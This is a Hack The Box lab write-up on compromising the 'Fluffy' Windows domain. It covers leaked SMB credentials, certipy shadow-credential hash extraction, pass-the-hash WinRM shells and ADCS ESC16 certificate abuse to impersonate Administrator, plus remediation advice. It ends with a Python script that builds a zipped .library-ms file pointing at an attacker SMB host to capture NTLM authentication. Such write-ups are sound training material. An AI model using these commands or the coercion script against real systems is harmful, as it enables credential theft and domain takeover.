
# Fluffy (HTB medium)
**Box:** Fluffy · **IP:** 10.10.11.69 · **Domain:** fluffy.htb · **OS:** Windows Server 2019 (17763)  
**Date (lab):** 2025-10-12

---

## Executive summary
Got initial access by leveraging a leaked service credential and a small ADCS/ESC16 abuse chain. I recovered a service account credential via a certificate-based shadow credential and NTLM extraction, used that to get a WinRM shell as `winrm_svc` and capture the user flag. From there I abused ADCS (ESC16) by updating a Cert Publisher account UPN, requested a certificate for `administrator`, then used that cert to get a TGT and extract the administrator NT hash. With that I got an Administrator WinRM shell and captured `root.txt`.

- Foothold: `j.fleischman` creds on SMB; dumped suspicious IT share files including `Upgrade_Notice.pdf`.  
- Escalation: shadow credential cert-auth to `winrm_svc` and NTLM extraction; later ADCS ESC16 cert abuse to impersonate Administrator.  
- Impact: full domain compromise; both user and admin flags captured.

---

## Attack chain summary
1. Recon - SMB and LDAP enumeration; grabbed interesting files from the IT share.  
2. Initial access - authenticated with leaked `j.fleischman` credentials and retrieved `winrm_svc` NT hash via certipy shadow flow.  
3. WinRM - authenticated to host as `winrm_svc`; retrieved `user.txt`.  
4. ADCS ESC16 - abused Cert Publishers and ESC16 to modify `ca_svc` UPN, request certificate for `administrator`, obtain TGT and NT hash.  
5. Admin takeover - used Administrator hash to get WinRM and captured `root.txt`.

---

## Technical breakdown

### Recon & SMB
Mapped the host and shares then downloaded a handful of items from the `IT` share including `Upgrade_Notice.pdf` which listed public CVEs and hinted at missing patches. The share also contained vendor tools and installers which may indicate weak patching practices.

Trimmed commands that reflect the flow (kept short for readability):
```bash
echo "10.10.11.69 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!' -c 'get Upgrade_Notice.pdf'
```

### Recover NTLM via shadow credential (certipy)
With the `j.fleischman` session I added `p.agila` to Service Accounts and used `certipy shadow auto` to generate a key credential for `winrm_svc` which returned both a TGT and the NTLM hash (example output saved in artifacts). The shadow flow gave an NT hash for `winrm_svc`: `33bd09dcd697600edf6b3a7af4875767` and for `ca_svc`: `ca0f4f9e9eb8a092addf53bb03fc98c8`.

Example certipy usage (trimmed):
```bash
certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc
# produced winrm_svc.ccache and NT hash printed to stdout
```

### WinRM as service account
Used `evil-winrm-py` with the collected NTLM to get an interactive shell as `winrm_svc` and retrieved `user.txt` from desktop. Short reproduction:
```bash
evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
# shell -> cat C:\Users\winrm_svc\Desktop\user.txt
```

### ADCS - ESC16 certificate abuse to impersonate Administrator
`certipy find` and newer `certipy` checks flagged `ESC16` (Security Extension disabled on CA). Because the CA did not include the strong mapping extension, a Cert Publisher could enroll a certificate with an arbitrary UPN and the CA would issue it without the mapping that ties certs to object SIDs. The chain used here:

1. From `winrm_svc` session, use certipy to read `ca_svc` attributes (it is in Cert Publishers).  
2. Update `ca_svc` UPN to `administrator` (temporary).  
3. Request a certificate as `ca_svc` for template `User` targeting the CA; `certipy req` returns `administrator.pfx`.  
4. Restore `ca_svc` UPN to original value.  
5. Use `certipy auth` on `administrator.pfx` to get a TGT and then extract the Administrator NT hash from the credential cache. Example flow (trimmed):
```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09... -user ca_svc -upn administrator update
certipy req -u ca_svc -hashes ca0f4f9e... -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
# credential cache saved to administrator.ccache and Administrator NT hash retrieved
```

### Admin WinRM and proof
Used the recovered Administrator NT hash with `evil-winrm-py` to get an Administrator shell and capture `root.txt`.

```bash
evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
# shell -> cat C:\Users\Administrator\Desktop\root.txt
```

---

## Key findings and remediation summary
- **GPP / share hygiene and weak patch posture** - IT share had installers and vendor materials; keep sensitive configs out of shares and control read permissions. Rotate any leaked credentials immediately.  
- **ADCS configuration** - ESC16 (security extension disabled) allowed certificate issuance without strong mapping; enable strong certificate mapping or restrict Cert Publishers and CA permissions.  
- **Service account privileges** - review and restrict `GenericWrite`/group membership for service accounts; avoid granting Cert Publisher rights to accounts that can be modified by other service accounts.  
- **Monitoring** - alert on rapid UPN changes, certificate requests for admin UPNs, and sudden mass cert enrollments; monitor for abnormal TGS/TGT usage patterns.

---

## Evidence & artifacts included
- `Upgrade_Notice.pdf` from IT share (lists relevant CVEs).  
- `winrm_svc.ccache`, `ca_svc.ccache`, and saved NTLM outputs (hashes in `hashes/`).  
- BloodHound export `20251012065955_bloodhound.zip` used for mapping.  
- PoC script used to craft `exploit.zip` and push to the share (included below).  
(Original raw logs and full command history preserved in archive; this report trims noisy command logs for readability.)

---

## Reflection
This one was a textbook ADCS / cert-mapping takeaway; small permissions plus an old CA config let me pivot to a full takeover. The fun part was stitching the cert flows together and seeing how a few well-placed modifications give you a ticket-based path to Administrator. Weekend well spent.

---

## Proof of concept - `poc.py`
It creates a simple `.library-ms` file that points to an attacker SMB host and zips it so it can be uploaded to the target share and trigger the victim to dereference the network path.

```python
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")


    library_content = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
\"\"\"

    library_file_name = f\"{file_name}.library-ms\"
    with open(library_file_name, \"w\", encoding=\"utf-8\") as f:
        f.write(library_content)


    with zipfile.ZipFile(\"exploit.zip\", mode=\"w\", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)


    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print(\"completed\")

if __name__ == \"__main__\":
    main()
```

---

